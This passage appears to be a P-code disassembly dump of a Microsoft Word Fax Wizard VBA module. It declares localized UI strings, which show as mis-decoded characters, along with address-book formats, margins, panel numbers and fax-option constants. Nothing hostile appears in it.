\"\u00b1H\u00a5\u00f3\u00aa\u00cc\u00a1G\"\"\n' Line #312:\n' \tReparse 0x002C \"Public Const strDATE    As String = \"\u00a4\u00e9\u00b4\u00c1\u00a1G\"\"\n' Line #313:\n' \tReparse 0x002C \"Public Const strRE      As String = \"\u00a5D\u00a6\u00ae\u00a1G\"\"\n' Line #314:\n' \tReparse 0x002C \"Public Const strCC      As String = \"\u00aa\u00fe\u00a5\u00bb\u00a1G\"\"\n' Line #315:\n' Line #316:\n' \tReparse 0x0038 \"Public Const strCOMPANY         As String = \"\u00a4\u00bd\u00a5q\u00a6\u00e6\u00b8\u00b9\u00a1G\"\"\n' Line #317:\n' \tReparse 0x0038 \"Public Const strFAX_NUMBER      As String = \"\u00b6\u00c7\u00afu\u00b9q\u00b8\u00dc\u00a1G\"\"\n' Line #318:\n' \tReparse 0x0034 \"Public Const strPHONE_NUMBER    As String = \"\u00b9q\u00b8\u00dc\u00a1G\"\"\n' Line #319:\n' \tReparse 0x0044 \"Public Const strTOTAL_NO_PAGES  As String = \"\u00a5]\u00a7t\u00ab\u00ca\u00ad\u00b1\u00a6b\u00a4\u00ba\u00c1`\u00a6@\u00ad\u00b6\u00bc\u00c6\u00a1G\"\"\n' Line #320:\n' Line #321:\n' \tReparse 0x0035 \"Public Const strEMPTY_MACRO As String = \"EmptyMacro \"\"\n' Line #322:\n' \tReparse 0x004F \"Public Const strNONE        As String = \"<None>\" 'choice to list of merge field\"\n' Line #323:\n' \tQuoteRem 0x0031 0x001A \"names found in data source\"\n' Line #324:\n' \tQuoteRem 0x0020 0x0028 \"doc. if there is no field for last name.\"\n' Line #325:\n' \tQuoteRem 0x0020 0x0029 \"if the user selected this choice we don't\"\n' Line #326:\n' \tQuoteRem 0x0020 0x0036 \"insert a merge field for last name in the cover sheet.\"\n' Line #327:\n' \tReparse 0x005A \"Public Const strFLD_NAME As String = \"Name\" 'to select the field containing recipient name\"\n' Line #328:\n' \tQuoteRem 0x0024 0x002A \"from the fields present in the data source\"\n' Line #329:\n' \tReparse 0x005A \"Public Const strFLD_FAX As String = \"Fax\" 'to select the merge field containing fax number\"\n' Line #330:\n' Line #331:\n' \tReparse 0x0046 \"Public Const strCLICK_HERE_NAME     As String = \"[\u00ab\u00f6\u00a4@\u00a4U\u00b3o\u00b8\u00cc\u00bf\u00e9\u00a4J\u00a9m\u00a6W]\"\"\n' Line #332:\n' \tReparse 0x004A \"Public Const strCLICK_HERE_PAGES    As String = \"[\u00ab\u00f6\u00a4@\u00a4U\u00b3o\u00b8\u00cc\u00bf\u00e9\u00a4J\u00b6\u00c7\u00afu\u00ad\u00b6\u00bc\u00c6]\"\"\n' Line #333:\n' \tReparse 0x004A \"Public Const strCLICK_HERE_SUBJECT  As String = \"[\u00ab\u00f6\u00a4@\u00a4U\u00b3o\u00b8\u00cc\u00bf\u00e9\u00a4J\u00b6\u00c7\u00afu\u00a5D\u00a6\u00ae]\"\"\n' Line #334:\n' \tReparse 0x004C \"Public Const strCLICK_HERE_COMMENTS As String = \"[\u00ab\u00f6\u00a4@\u00a4U\u00b3o\u00b8\u00cc\u00bf\u00e9\u00a4J\u00a5\u00b2\u00adn\u00aa\u00ba\u00b5\u00f9\u00b0O]\"\"\n' Line #335:\n' \tReparse 0x004A \"Public Const strCLICK_HERE_COMPANY  As String = \"[\u00ab\u00f6\u00a4@\u00a4U\u00b3o\u00b8\u00cc\u00bf\u00e9\u00a4J\u00a4\u00bd\u00a5q\u00a6W\u00ba\u00d9]\"\"\n' Line #336:\n' \tReparse 0x004A \"Public Const strCLICK_HERE_PHONE_NUMBER As String = \"[\u00ab\u00f6\u00a4@\u00a4U\u00b3o\u00b8\u00cc\u00bf\u00e9\u00a4J\u00b9q\u00b8\u00dc]\"\"\n' Line #337:\n' \tReparse 0x004C \"Public Const strCLICK_HERE_FAX_NUMBER As String = \"[\u00ab\u00f6\u00a4@\u00a4U\u00b3o\u00b8\u00cc\u00bf\u00e9\u00a4J\u00b6\u00c7\u00afu\u00b9q\u00b8\u00dc]\"\"\n' Line #338:\n' Line #339:\n' \tQuoteRem 0x0000 0x0059 \"Address format to get info. from the Address book. Please be careful about the commas and\"\n' Line #340:\n' \tQuoteRem 0x0000 0x0064 \"spaces since you might end up with a space at the beginning of a name if not put at the right place.\"\n' Line #341:\n' \tQuoteRem 0x0000 0x0039 \"Please change the names only if you know the correct one.\"\n' Line #342:\n' \tReparse 0x0066 \"Public Const strADDR_BK_NAME_FORMAT As String = \"{{<PR_GIVEN_NAME> }{<PR_SURNAME>}|<PR_DISPLAY_NAME>}\"\"\n' Line #343:\n' \tReparse 0x00A5 \"Public Const strADDR_BK_ADDR_FORMAT As String = \"{<PR_POSTAL_ADDRESS>|{<PR_STREET_ADDRESS>\" & vbCr & \"}{<PR_LOCALITY>}{, {<PR_STATE_OR_PROVINCE> }<PR_POSTAL_CODE>}}\"\"\n' Line #344:\n' \tReparse 0x007B \"Public Const strADDR_BK_FAXNUM_FORMAT As String = \"{<PR_PRIMARY_FAX_NUMBER>|<PR_BUSINESS_FAX_NUMBER>|<PR_HOME_FAX_NUMBER>}\"\"\n' Line #345:\n' \tReparse 0x008E \"Public Const strADDR_BK_PHONE_FORMAT As String = \"{<PR_PRIMARY_TELEPHONE_NUMBER>|<PR_BUSINESS_TELEPHONE_NUMBER>|<PR_OFFICE_TELEPHONE_NUMBER>}\"\"\n' Line #346:\n' \tReparse 0x0048 \"Public Const strADDR_BK_COMPANY_FORMAT As String = \"{<PR_COMPANY_NAME>}\"\"\n' Line #347:\n' Line #348:\n' \tQuoteRem 0x0000 0x0053 \"status messages put up while faxing the cover sheet and document. For some messages\"\n' Line #349:\n' \tQuoteRem 0x0000 0x002C \"I add \"...\" and so add \"...\" to all strings.\"\n' Line #350:\n' \tReparse 0x0053 \"Public Const strFAXING_DOC_RECIPIENTS As String = \"\u00a5\u00bf\u00a6b\u00b6\u00c7\u00afu\u00b3o\u00a5\u00f7\u00a4\u00e5\u00a5\u00f3\u00b5\u00b9\u00a9\u00d2\u00a6\u00b3\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc...\"\"\n' Line #351:\n' \tReparse 0x004B \"Public Const strFAXING_DOC_RECIPIENT As String = \"\u00a5\u00bf\u00a6b\u00b6\u00c7\u00afu\u00b3o\u00a5\u00f7\u00a4\u00e5\u00a5\u00f3\u00b5\u00b9\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc\"\"\n' Line #352:\n' \tReparse 0x004E \"Public Const strFAXING_CS_RECIPIENTS As String = \"\u00a5\u00bf\u00a6b\u00b6\u00c7\u00afu\u00ab\u00ca\u00ad\u00b1\u00b5\u00b9\u00a9\u00d2\u00a6\u00b3\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc...\"\"\n' Line #353:\n' \tReparse 0x004A \"Public Const strFAXING_CS_RECIPIENT As String = \"\u00a5\u00bf\u00a6b\u00b6\u00c7\u00afu\u00ab\u00ca\u00ad\u00b1\u00b5\u00b9\u00a9\u00d2\u00a6\u00b3\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc\"\"\n' Line #354:\n' \tReparse 0x0039 \"Public Const strFAXING_CS_TO As String = \"\u00a5\u00bf\u00a6b\u00b6\u00c7\u00afu\u00ab\u00ca\u00ad\u00b1\u00a8\u00ec\"\"\n' Line #355:\n' \tReparse 0x003A \"Public Const strFAXING_DOC_TO As String = \"\u00a5\u00bf\u00a6b\u00b6\u00c7\u00afu\u00a4\u00e5\u00a5\u00f3\u00a8\u00ec\"\"\n' Line #356:\n' Line #357:\n' \tQuoteRem 0x0000 0x001A \"the text in the last panel\"\n' Line #358:\n' \tQuoteRem 0x0000 0x005E \"the first one is the default. The next string is used if the user selects no cover sheet, when\"\n' Line #359:\n' \tQuoteRem 0x0000 0x002B \"we actually send the fax on clicking Finish\"\n' Line #360:\n' \tReparse 0x00E4 \"Public Const strLAST_PANEL_DFLT_TEXT As String = \"\u00a6p\u00aaG\u00b0\u00f5\u00a6\u00e6\u00ba\u00eb\u00c6F\u00a6\u00b3\u00b0\u00dd\u00c3D\u00aa\u00ba\u00b8\u00dc\u00a1A\u00bd\u00d0\u00ad\u00ab\u00b7s\u00b0\u00f5\u00a6\u00e6\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\u00a1A\u00c0\u00cb\u00acd\u00bf\u00e9\u00a4J\u00b6\u00c7\u00afu\u00b9q\u00b8\u00dc\u00aa\u00ba\u00ae\u00e6\u00a6\u00a1\u00acO\u00a7_\u00a5\u00bf\u00bdT\u00a1C\u00a8\u00d2\u00a6p\u00a1A\u00b1z\u00acO\u00a4\u00a3\u00acO\u00a7\u00d1\u00a4F\u00b6Q\u00a4\u00bd\u00a5q\u00aa\u00ba\u00b9q\u00b8\u00dc\u00a8t\u00b2\u00ce\u00a6b\u00bc\u00b7\u00a5~\u00bdu\u00abe\u00a1A\u00bb\u00dd\u00a5\u00fd\u00ab\u00f6\u00ad\u00d3\u00c1\u00e4\u00a1A\u00a4\u00f1\u00a6p\u00bb\u00a1\u00bc\u00c6\u00a6r\u00c1\u00e4\u00a1u9\u00a1v\u00a1C\u00adn\u00b0O\u00b1o\u00a5[\u00b6i\u00b6\u00c7\u00afu\u00b9q\u00b8\u00dc\u00a4\u00a4\u00b3\u00e1\u00a1I\"\"\n' Line #361:\n' \tReparse 0x0071 \"Public Const strLAST_PANEL_NOCOVSHT_TEXT As String = \"\u00a9\u00d2\u00a6\u00b3\u00b8\u00ea\u00ae\u00c6\u00a4w\u00bf\u00e9\u00a4J\u00a7\u00b9\u00b2\u00a6\u00a1A\u00ab\u00f6\u00a4@\u00a4U\u00a7\u00b9\u00a6\u00a8\u00c1\u00e4\u00a1A\u00ba\u00eb\u00c6F\u00b1N\u00b0e\u00a5X\u00b1z\u00aa\u00ba\u00b6\u00c7\u00afu\u00a4\u00e5\u00a5\u00f3\u00a1I\"\"\n' Line #362:\n' Line #363:\n' \tQuoteRem 0x0000 0x003B \"strings necessary to display help in case of failure of Fax\"\n' Line #364:\n' \tReparse 0x00A3 \"Public Const strHLP_FAX_INSTALL As String = \"\u00a6p\u00aaG\u00b1z\u00b2{\u00a6b\u00b0\u00f5\u00a6\u00e6\u00aa\u00ba\u00acO Windows 95\u00a1A\u00b2{\u00a6b\u00b1z\u00b4N\u00a5i\u00a5H\u00a6w\u00b8\u00cb\u00a5\u00bb\u00ba\u00eb\u00c6F\u00a4F\u00a1C\u00ab\u00f6\u00a4U\u00bdT\u00a9w\u00c1\u00e4\u00a1A\u00bf\u00c3\u00b9\u00f5\u00a4W\u00b1N\u00b7|\u00a5X\u00b2{\u00bb\u00b2\u00a7U\u00bb\u00a1\u00a9\u00fa\u00a4\u00e5\u00a5\u00f3\u00a1A\u00a7i\u00b6D\u00b1z\u00a6p\u00a6\u00f3\u00a6w\u00b8\u00cb\u00ba\u00eb\u00c6F\u00a1I\"\"\n' Line #365:\n' \tQuoteRem 0x0000 0x0040 \"the next string is the title as it appears on Word's main window\"\n' Line #366:\n' \tReparse 0x0034 \"Public Const strMS_WORD As String = \"Microsoft Word\"\"\n' Line #367:\n' Line #368:\n' \tQuoteRem 0x0000 0x0070 \"make sure that strCMD_BAR_TITLE is as long as strCMD_BTN_TEXT, so that strCMD_BTN_TITLE does not get clipped off\"\n' Line #369:\n' \tQuoteRem 0x0000 0x0022 \"when the command bar is displayed.\"\n' Line #370:\n' \tReparse 0x003A \"Public Const strCMD_BAR_TITLE   As String = \"\u00a4\u00a4\u00a4\u00e5\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\"\"\n' Line #371:\n' \tReparse 0x003A \"Public Const strCMD_BTN_TEXT    As String = \"\u00b2{\u00a6b\u00b0e\u00a5X\u00b6\u00c7\u00afu\"\"\n' Line #372:\n' Line #373:\n' \tReparse 0x0039 \"Public Const strCURRENT_DOC     As String = \"\u00a5\u00d8\u00abe\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3(\"\"\n' Line #374:\n' \tReparse 0x002F \"Public Const strRIGHT_PAREN     As String = \")\"\"\n' Line #375:\n' Line #376:\n' \tQuoteRem 0x0000 0x0064 \"Window caption of the cover sheet (the document's name will follow if the user is faxing a document)\"\n' Line #377:\n' \tReparse 0x003C \"Public Const strWINDOW_CAPTION  As String = \"\u00aa\u00ba\u00b6\u00c7\u00afu\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\"\"\n' Line #378:\n' \tQuoteRem 0x0000 0x004B \"Window caption if user is not faxing a doc. and just created a cover sheet.\"\n' Line #379:\n' \tReparse 0x0041 \"Public Const strCOVER_SHEET_CAPTION As String = \" - \u00b6\u00c7\u00afu\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\"\"\n' Line #380:\n' Line #381:\n' \tQuoteRem 0x0000 0x0030 \"Text in merge fields inserted in the cover sheet\"\n' Line #382:\n' \tReparse 0x0032 \"Public Const strFLD_FAX_NAME    As String = \"Name\"\"\n' Line #383:\n' \tReparse 0x0037 \"Public Const strFLD_FAX_NUMBER  As String = \"FaxNumber\"\"\n' Line #384:\n' Line #385:\n' \tQuoteRem 0x0000 0x0060 \"In NT3.51, the printer name from the print set up dialog which is called when the user clicks on\"\n' Line #386:\n' \tQuoteRem 0x0000 0x0046 \"Other... , returns the printer name with the printer location after ON\"\n' Line #387:\n' \tQuoteRem 0x0000 0x004D \"so if a printer name is \\\\abcd\\efg with location \"location1\" then the printer\"\n' Line #388:\n' \tQuoteRem 0x0000 0x004D \"name is returned a \"\\\\abcd\\efg ON location1. So we have to strip out the text\"\n' Line #389:\n' \tQuoteRem 0x0000 0x004F \"after ON. That's what this constant is for. In other countries too is this text\"\n' Line #390:\n' \tQuoteRem 0x0000 0x000F \"going to be ON?\"\n' Line #391:\n' \tReparse 0x0032 \"Public Const strPRINTER_ON      As String = \" ON \"\"\n' Line #392:\n' Line #393:\n' \tReparse 0x0042 \"Public Const iMAX_ADDR_LINES = 3 'max. # of lines address can have\"\n' Line #394:\n' \tQuoteRem 0x0000 0x000E \"Error messages\"\n' Line #395:\n' \tReparse 0x0044 \"Public Const strERR_MAX_ADDR_LINES  As String = \"\u00a6a\u00a7}\u00a4\u00a3\u00a5i\u00b6W\u00b9L\u00a4T\u00a6\u00e6\u00a1C\"\"\n' Line #396:\n' \tReparse 0x004A \"Public Const strERR_NO_DATA_SRC     As String = \"\u00ba\u00eb\u00c6F\u00a7\u00e4\u00a4\u00a3\u00a8\u00ec\u00adn\u00b6\u00c7\u00afu\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3\u00a1C\"\"\n' Line #397:\n' \tReparse 0x0067 \"Public Const strERR_CREATING_CMDBAR As String = \"\u00ba\u00eb\u00c6F\u00b5L\u00aak\u00ab\u00d8\u00a5\u00df\u00a1uSend Fax\u00a1v\u00a4u\u00a8\u00e3\u00a6C\u00a1C \u00bd\u00d0\u00ad\u00ab\u00b7s\u00b0\u00f5\u00a6\u00e6\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\u00a1C\"\"\n' Line #398:\n' \tReparse 0x0049 \"Public Const strERR_NO_MAIN_DOC1     As String = \"\u00adn\u00ab\u00d8\u00a5\u00df\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3 (\"\"\n' Line #399:\n' \tReparse 0x005F \"Public Const strERR_NO_MAIN_DOC2     As String = \") \u00a5\u00bc\u00b6}\u00b1\u00d2\u00a1C\u00bd\u00d0\u00a5\u00fd\u00b6}\u00b1\u00d2\u00b8\u00d3\u00a4\u00e5\u00a5\u00f3\u00a1A\u00b5M\u00ab\u00e1\u00ad\u00ab\u00b7s\u00b0\u00f5\u00a6\u00e6\u00ba\u00eb\u00c6F\u00a1I\"\"\n' Line #400:\n' \tReparse 0x0050 \"Public Const strERR_DISPLAY_QUERY_OPTIONS As String = \"\u00ba\u00eb\u00c6F\u00a7\u00e4\u00a4\u00a3\u00a8\u00ec\u00adn\u00a5[\u00a4J\u00aa\u00ba\u00b8\u00ea\u00ae\u00c6\u00a1C\"\"\n' Line #401:\n' \tReparse 0x004D \"Public Const strERR_CHOOSING_DOC As String = \"\u00ba\u00eb\u00c6F\u00b5L\u00aak\u00bf\u00ef\u00a8\u00fa\u00adn\u00a5\u00ce\u00a8\u00d3\u00b6\u00c7\u00afu\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3\u00a1C\"\"\n' Line #402:\n' \tReparse 0x007A \"Public Const strERR_RCPNTS_NOT_CHOSEN As String = \"\u00ba\u00eb\u00c6F\u00bb\u00dd\u00adn\u00aa\u00be\u00b9D\u00b3o\u00a5\u00f7\u00aa\u00ba\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc\u00acO\u00bd\u00d6\u00a1C\u00bd\u00d0\u00ab\u00f6\u00a4U\u00a1u\u00bdT\u00a9w\u00a1v\u00b6s\u00a1A\u00b5M\u00ab\u00e1\u00bf\u00ef\u00a8\u00fa\u00b6\u00c7\u00afu\u00aa\u00ba\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc\u00a1C\"\"\n' Line #403:\n' Line #404:\n' \tQuoteRem 0x0000 0x0034 \"this tip is displayed in an Autodown balloon finally\"\n' Line #405:\n' \tReparse 0x00AB \"Public Const strPOST_WIZARD_TIP_NO_MRG_FLD As String = \"\u00bd\u00d0\u00bf\u00e9\u00a4J\u00a8\u00e4\u00a5\u00a6\u00b1z\u00b7Q\u00bcg\u00a6b\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00a4W\u00aa\u00ba\u00b8\u00ea\u00ae\u00c6\u00a1A\u00b5M\u00ab\u00e1\u00ab\u00f6\u00a4U\u00a6b \" & strCMD_BAR_TITLE & \" \u00a4u\u00a5y\u00a6C\u00a4W\u00aa\u00ba\u00a1u\" & strCMD_BTN_TEXT & \"\u00a1v\u00b6s\u00a1C \"\"\n' Line #406:\n' \tQuoteRem 0x0000 0x006C \"this tip is displayed if we inserted merge fields in the cover sheet i.e. in the case of multiple recipients\"\n' Line #407:\n' \tReparse 0x0108 \"Public Const strPOST_WIZARD_TIP_MRG_FLD As String = \"\u00bd\u00d0\u00bf\u00e9\u00a4J\u00a8\u00e4\u00a5\u00a6\u00b1z\u00b7Q\u00bcg\u00a6b\u00ab\u00ca\u00ad\u00b1\u00aa\u00ed\u00b3\u00e6\u00a4W\u00aa\u00ba\u00b8\u00ea\u00ae\u00c6\u00a1A\u00b5M\u00ab\u00e1\u00ab\u00f6\u00a4U\u00a6b \" & strCMD_BAR_TITLE & \" \u00a4u\u00a5y\u00a6C\u00a4W\u00aa\u00ba\u00a1u\" & strCMD_BTN_TEXT & \"\u00a1v\u00b6s\u00a1C \" & \"\u00a6\u00fd\u00bd\u00d0\u00a4\u00a3\u00adn\u00a7R\u00b0\u00a3\u00a6b\u00a1u<< >>\u00a1v\u00b2\u00c5\u00b8\u00b9\u00a4\u00a4\u00aa\u00ba\u00c4\u00e6\u00a6\u00ec\u00a1F\u00b5y\u00ab\u00e1\u00b6\u00c7\u00afu\u00ba\u00eb\u00c6F\u00b1N\u00a7Q\u00a5\u00ce\u00a5L\u00ad\u00cc\u00a8\u00d3\u00b6\u00c7\u00afu\u00b1z\u00ab\u00fc\u00a9w\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3\u00a8\u00ec\u00a6\u00ac\u00a5\u00f3\u00aa\u00cc\u00a4\u00e2\u00a4W\u00a1C\"\"\n' Line #408:\n' Line #409:\n' \tQuoteRem 0x0000 0x003D \"this message is put up after we successfully faxed everything\"\n' Line #410:\n' \tReparse 0x0048 \"Public Const strMSG_FAX_SUCCESS As String = \"\u00ba\u00eb\u00c6F\u00a4w\u00b1N\u00b1z\u00aa\u00ba\u00a4\u00e5\u00a5\u00f3\u00b0e\u00a5X\u00a5h\u00a4F\u00a1C\"\"\n' Line #411:\n' Line #412:\n' \tQuoteRem 0x0000 0x0052 \"the 72 factor in the below 2 measurements is conversion factor of inches to points\"\n' Line #413:\n' \tQuoteRem 0x0000 0x002F \"contemporary styles have a left indent of 0.56\"\"\n' Line #414:\n' \tReparse 0x0034 \"Public Const sCONT_LEFT_INDENT As Single = 0.56 * 72\"\n' Line #415:\n' \tQuoteRem 0x0000 0x0041 \"While converting text to table, for the Contemporary style alone,\"\n' Line #416:\n' \tQuoteRem 0x0000 0x0044 \"I need to set the first column's width explicitly. For English text,\"\n' Line #417:\n' \tQuoteRem 0x0000 0x0048 \"0.5\" is big enough. If the text in the first column is getting truncated\"\n' Line #418:\n' \tQuoteRem 0x0000 0x0032 \"in your language, then please increase this value.\"\n' Line #419:\n' \tReparse 0x0033 \"Public Const sCONT_WIDTH_COL1 As Single = 2.36 * 72\"\n' Line #420:\n' Line #421:\n' \tQuoteRem 0x0000 0x0040 \"The date format need not be localized if VB does not require it.\"\n' Line #422:\n' \tQuoteRem 0x0000 0x0045 \"Medium date is of the format \"02-Apr-94\". If the standard date format\"\n' Line #423:\n' \tQuoteRem 0x0000 0x003C \"is anything different in the country, then please change it.\"\n' Line #424:\n' \tQuoteRem 0x0000 0x004F \"important to have MMMM and not mmmm, since mm refers to minutes in a time field\"\n' Line #425:\n' \tReparse 0x0036 \"Public Const strDATE_FORMAT As String = \"MMMM d, yyyy\"\"\n' Line #426:\n' Line #427:\n' \tQuoteRem 0x0000 0x004F \"'******************************************************************************\"\n' Line #428:\n' \tQuoteRem 0x0000 0x0036 \"DO NOT LOCALIZE THE CONSTANTS/DECLARATIONS BEYOND THIS\"\n' Line #429:\n' \tQuoteRem 0x0000 0x004F \"'******************************************************************************\"\n' Line #430:\n' \tQuoteRem 0x0000 0x0042 \"the following are the names of the autotext entries in the wizard.\"\n' Line #431:\n' \tQuoteRem 0x0000 0x003D \"DON'T CHANGE THE NAMES OF THE AUTOTEXT ENTRIES IN THE WIZARD.\"\n' Line #432:\n' \tQuoteRem 0x0000 0x0051 \"if you change them, then please change the following strings too, correspondingly\"\n' Line #433:\n' \tReparse 0x003B \"Public Const strAT_UNCHKD_BOX   As String = \"Unchecked Box\"\"\n' Line #434:\n' \tReparse 0x0039 \"Public Const strAT_CHKD_BOX     As String = \"Checked Box\"\"\n' Line #435:\n' \tReparse 0x0038 \"Public Const strCNTMPGFX2        As String = \"cntmpgfx2\"\"\n' Line #436:\n' \tReparse 0x0045 \"Public Const strPOST_WIZ_BLN    As String = \"Fax Post Wizard Balloon\"\"\n' Line #437:\n' Line #438:\n' \tReparse 0x0031 \"Public Const sA4_LEFT_MARGIN    As Single = 82.08\"\n' Line #439:\n' \tReparse 0x0032 \"Public Const sA4_RIGHT_MARGIN    As Single = 81.36\"\n' Line #440:\n' \tReparse 0x002E \"Public Const sLETTER_MARGIN     As Single = 90\"\n' Line #441:\n' \tQuoteRem 0x0000 0x0023 \"key where setup writes company name\"\n' Line #442:\n' \tReparse 0x006E \"Public Const strREGKEY_CMPNY_NAME As String = \"HKEY_CURRENT_USER\\Software\\Microsoft\\MS Setup (ACME)\\User Info\"\"\n' Line #443:\n' \tReparse 0x003A \"Public Const strVALKEY_CMPNY_NAME As String = \"DefCompany\"\"\n' Line #444:\n' Line #445:\n' \tDim (Public) \n' \tVarDefn fDocChanged (As Boolean)\n' \tQuoteRem 0x001E 0x0028 \"set if user changes the doc. to be faxed\"\n' Line #446:\n' Line #447:\n' \tDim (Public) \n' \tVarDefn objMainDoc (As Document)\n' \tQuoteRem 0x001E 0x001D \"main doc which has to be sent\"\n' Line #448:\n' \tDim (Public) \n' \tVarDefn objDataSrc (As MailMergeDataSource)\n' \tQuoteRem 0x0029 0x0014 \" main doc's data src\"\n' Line #449:\n' Line #450:\n' \tQuoteRem 0x0000 0x0037 \"SQL query used to select all names from the data source\"\n' Line #451:\n' \tReparse 0x0039 \"Public Const strSELECT_QUERY As String = \"Select * From \"\"\n' Line #452:\n' Line #453:\n' \tQuoteRem 0x0000 0x0023 \"form and callback balloon constants\"\n' Line #454:\n' \tReparse 0x0044 \"Public Const iMAX_PANEL As Integer = 6 'panel # of the last panel in\"\n' Line #455:\n' \tQuoteRem 0x001D 0x001A \"the dialog (starts from 0)\"\n' Line #456:\n' \tDim (Public) \n' \tOptionBase \n' \tLd iMAX_PANEL \n' \tVarDefn rgstrAssistantMsg (As String)\n' \tQuoteRem 0x0031 0x001C \" as many as there are states\"\n' Line #457:\n' Line #458:\n' \tDim (Public) \n' \tVarDefn strBULLET (As String) 0x0015\n' Line #459:\n' \tDim (Public) \n' \tVarDefn strSOFT_ENTER (As String)\n' Line #460:\n' \tDim (Public) \n' \tOptionBase \n' \tLitDI2 0x0003 \n' \tVarDefn rgstrNotes (As String)\n' Line #461:\n' \tDim (Public) \n' \tVarDefn strQUOTE (As String)\n' Line #462:\n' \tQuoteRem 0x0000 0x0010 \"available styles\"\n' Line #463:\n' \tReparse 0x002E \"Public Const iSTY_PROFESSIONAL  As Integer = 0\"\n' Line #464:\n' \tReparse 0x002E \"Public Const iSTY_CONTEMPORARY  As Integer = 1\"\n' Line #465:\n' \tReparse 0x002E \"Public Const iSTY_ELEGANT       As Integer = 2\"\n' Line #466:\n' Line #467:\n' \tQuoteRem 0x0000 0x002F \"array for holding long and short template names\"\n' Line #468:\n' \tDim (Public) \n' \tOptionBase \n' \tLitDI2 0x0003 \n' \tOptionBase \n' \tLitDI2 0x0003 \n' \tVarDefn rgstrTemplateFileNames (As String)\n' Line #469:\n' \tReparse 0x0026 \"Public Const iLONG_NAME As Integer = 0\"\n' Line #470:\n' \tReparse 0x0027 \"Public Const iSHORT_NAME As Integer = 1\"\n' Line #471:\n' Line #472:\n' \tDim (Public) \n' \tVarDefn iFaxStyle (As Integer)\n' \tQuoteRem 0x001C 0x001B \"stores the fax style chosen\"\n' Line #473:\n' \tDim (Public) \n' \tVarDefn fStylesCopied (As Boolean)\n' Line #474:\n' Line #475:\n' \tDim (Public) \n' \tVarDefn fMSFAXEnabled (As Boolean)\n' \tQuoteRem 0x0020 0x000E \"disabled in NT\"\n' Line #476:\n' Line #477:\n' \tQuoteRem 0x0000 0x000D \"Panel numbers\"\n' Line #478:\n' \tReparse 0x0029 \"Public Const iPANEL_RCPNTS As Integer = 3\"\n' Line #479:\n' \tReparse 0x0029 \"Public Const iPANEL_SENDER As Integer = 5\"\n' Line #480:\n' \tReparse 0x0029 \"Public Const iPANEL_STYLE  As Integer = 4\"\n' Line #481:\n' Line #482:\n' \tQuoteRem 0x0000 0x0019 \"Max. number of recipients\"\n' Line #483:\n' \tReparse 0x0027 \"Public Const iMAX_RCPNTS As Integer = 5\"\n' Line #484:\n' Line #485:\n' \tDim (Public) \n' \tVarDefn fDocIsFormLtr (As Boolean)\n' \tQuoteRem 0x0020 0x001D \"true if doc. is a form letter\"\n' Line #486:\n' \tQuoteRem 0x0000 0x0049 \"to store the data options query that the user selects for the form letter\"\n' Line #487:\n' \tDim (Public) \n' \tVarDefn strFormLetterSQL (As String)\n' Line #488:\n' \tDim (Public) \n' \tVarDefn strFormLetterSQL1 (As String)\n' Line #489:\n' \tDim (Public) \n' \tVarDefn strConnectString (As String)\n' Line #490:\n' \tDim (Public) \n' \tVarDefn fDocPresent (As Boolean) 0x0015\n' \tQuoteRem 0x0020 0x0023 \"true if there is an main doc. apart\"\n' Line #491:\n' \tQuoteRem 0x0020 0x001F \"from the doc created by FileNew\"\n' Line #492:\n' \tQuoteRem 0x0000 0x0029 \"keeps track of which panel to be skipped.\"\n' Line #493:\n' \tQuoteRem 0x0000 0x003F \"if we are enabling a panel, then we need to restore the shape's\"\n' Line #494:\n' \tQuoteRem 0x0000 0x003A \"color to as it was before. rgiColorShape stores that color\"\n' Line #495:\n' \tDim (Public) \n' \tOptionBase \n' \tLd iMAX_PANEL \n' \tVarDefn rgfSkipPanel (As Boolean)\n' \tQuoteRem 0x002B 0x001B \"if rgfSkipPanel(i) is True,\"\n' Line #496:\n' \tQuoteRem 0x002C 0x0017 \"then skip the ith panel\"\n' Line #497:\n' \tDim (Public) \n' \tOptionBase \n' \tLd iMAX_PANEL \n' \tVarDefn rgiColorShape (As Long)\n' Line #498:\n' \tDim (Public) \n' \tVarDefn fCheckValidity (As Boolean)\n' Line #499:\n' \tDim (Public) \n' \tVarDefn fNoCovSht (As Boolean)\n' \tQuoteRem 0x001C 0x0026 \"False if user selects \"No cover sheet\"\"\n' Line #500:\n' Line #501:\n' \tDim (Public) \n' \tVarDefn iFaxOption (As Integer) 0x0018\n' \tQuoteRem 0x0023 0x0020 \"Fax program selected by the user\"\n' Line #502:\n' \tReparse 0x0036 \"Public Const iMS_FAX    As Integer = 0  'Microsoft Fax\"\n' Line #503:\n' \tReparse 0x003A \"Public Const iDIFF_FAX  As Integer = 1  'Other than MS Fax\"\n' Line #504:\n' \tReparse 0x0056 \"Public Const iNO_FAX    As Integer = 2  'just print without faxing the doc/cover sheet\"\n' Line #505:\n' Line #506:\n' \tDim (Public) \n' \tVarDefn fRegistryNamesRead (As Boolean)\n' \tQuoteRem 0x0025 0x0028 \"true if MRU list has been read from reg.\"\n' Line #507:\n' Line #508:\n' \tDim \n' \tOptionBase \n' \tLitDI2 0x0003 \n' \tVarDefn rgstrFaxTitle (As String) 0x001C\n' Line #509:\n' \tDim \n' \tOptionBase \n' \tLitDI2 0x0005 \n' \tVarDefn rgstrChkBoxText (As String) 0x001C\n' \tQuoteRem 0x0026 0x001B \"text beside the check boxes\"\n' Line #510:\n' \tDim (Public) \n' \tVarDefn strAsstMsgRcpntsFormLtr (As String)\n' \tQuoteRem 0x0029 0x0030 \"assistant help for form letter recipients' panel\"\n' Line #511:\n' \tDim (Public) \n' \tVarDefn strAsstMsgRcpntsOrdDoc (As String)\n' 